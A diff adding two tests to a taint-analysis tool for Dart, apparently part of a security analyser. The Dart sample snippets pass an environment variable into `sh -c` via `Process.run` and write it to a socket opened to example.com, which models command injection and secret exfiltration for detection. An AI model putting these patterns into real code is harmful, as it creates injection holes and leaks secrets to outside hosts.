@@ -175,3 +175,29 @@ def test_dart_untainted_io_emits_no_flow(tmp_path: Path) -> None:
         "}\n"
     )
     assert _run_flow(tmp_path, source) == set()
+
+
+def test_dart_env_flows_to_process_run_argument(tmp_path: Path) -> None:
+    # `Process.run('sh', [k])` executes a subprocess: the command literal is
+    # the PROCESS resource identity and the tainted argument list reaching it
+    # models command injection (issue #1224).
+    source = (
+        "void leak() {\n"
+        "  var k = Platform.environment['K'];\n"
+        "  Process.run('sh', ['-c', k]);\n"
+        "}\n"
+    )
+    assert (_ENV_K, "resource::PROCESS::sh") in _run_flow(tmp_path, source)
+
+
+def test_dart_env_flows_to_socket_write(tmp_path: Path) -> None:
+    # `Socket.connect(host, port)` binds a SOCKET handle keyed by the host;
+    # `s.write(k)` sends the ENV-tainted value on it (issue #1224).
+    source = (
+        "void leak() async {\n"
+        "  var k = Platform.environment['K'];\n"
+        "  var s = await Socket.connect('example.com', 80);\n"
+        "  s.write(k);\n"
+        "}\n"
+    )
+    assert (_ENV_K, "resource::SOCKET::example.com") in _run_flow(tmp_path, source)
